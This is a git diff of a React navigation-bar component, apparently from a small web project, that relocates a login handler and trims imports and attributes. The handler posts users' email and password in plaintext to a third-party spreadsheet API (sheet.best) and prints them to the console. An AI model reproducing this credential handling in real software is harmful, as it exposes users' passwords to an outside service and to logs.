@@ -15,8 +15,6 @@ import DialogContent from '@mui/material/DialogContent';
 import DialogContentText from '@mui/material/DialogContentText';
 import DialogTitle from '@mui/material/DialogTitle';
 import Slide from '@mui/material/Slide';
-import plantas from "../../img/plantas-vertical.png";
-import { toBeInTheDOM } from "@testing-library/jest-dom/dist/matchers";
 
 const URL_LOGIN = "http://localhost/ws-login/login.php"
 
@@ -35,11 +33,37 @@ const resp = await fetch(url, {
     console.log(json);
 }
 
+
 const Transition = React.forwardRef(function Transition(props, ref) {
     return <Slide direction="up" ref={ref} {...props} />;
   });
 
 export default function Navbar(){
+
+    const refUsuario = useRef(null);
+    const refClave = useRef(null);
+
+    const handleLogin=()=> {
+        const data = {
+            "usuario": refUsuario.current.value,
+            "clave": refClave.current.value
+        }
+        
+        fetch('https://sheet.best/api/sheets/d7e4405d-c143-45c4-881b-157eec610464',{
+            method:'POST',
+            mode: 'cors',
+            headers:{
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                "Correo": data.usuario,
+                "Contraseña": data.clave
+            })
+        });
+        console.log(data);
+        enviarData( URL_LOGIN, data);
+    }
+
     const [openInicio, setOpenInicio] = React.useState(false);
   
         const handleClickOpenInicio = () => {
@@ -76,30 +100,6 @@ export default function Navbar(){
               setOpenVolver(false);
             };
 
-    const refUsuario = useRef(null);
-    const refClave = useRef(null);
-
-    const handleLogin=()=> {
-        const data = {
-            "usuario": refUsuario.current.value,
-            "clave": refClave.current.value
-        }
-        
-        fetch('https://sheet.best/api/sheets/d7e4405d-c143-45c4-881b-157eec610464',{
-            method:'POST',
-            mode: 'cors',
-            headers:{
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                "Correo": data.usuario,
-                "Contraseña": data.clave
-            })
-        });
-        console.log(data);
-        enviarData( URL_LOGIN, data);
-    }   
-          
     return(
         <>
         <SideNav id="Sidebar">
@@ -117,8 +117,6 @@ export default function Navbar(){
                                 keepMounted
                                 onClose={handleCloseInicio}
                                 aria-describedby="alert-dialog-slide-description"
-                                id = "formulario"
-                                class= "formulario"
                             >
                                 <DialogTitle className = "Titulo">{"INICIAR SESIÓN"}</DialogTitle>
                                 <DialogContent>
